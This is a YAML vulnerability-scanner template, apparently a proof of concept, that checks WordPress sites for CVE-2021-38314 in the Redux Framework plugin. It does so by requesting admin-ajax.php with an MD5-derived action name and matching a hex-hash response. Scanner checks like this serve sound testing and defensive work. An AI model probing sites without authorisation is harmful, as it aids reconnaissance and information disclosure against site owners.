name: yaml-poc-redux-gutenberg_template_library_\&_redux_framework-other-CVE-2021-38314
binding: e9ece9f2-e74f-48b2-8fe2-632c4d4f4cea
detail:
    author: jiapeng.han
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-38314
        - https://www.cybersecurity-help.cz/vdb/SB2021090309
        - https://www.wordfence.com/blog/2021/09/over-1-million-sites-affected-by-redux-framework-vulnerabilities/
    vulnerability:
        id: b1c97e8f-d898-4d77-86cf-e9a0b7051744
        level: medium
    warning: Harmless
transport: http
set:
    baseUrl: request.url.scheme + "://" + request.url.domain + "/-redux"
    md5Url: md5(baseUrl)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action={{md5Url}}
            follow_redirects: false
        expression: response.status == 200 && "^[a-f0-9]{32}$".matches(response.body_string) && response.content_type.contains("text/html")
expression: r0()
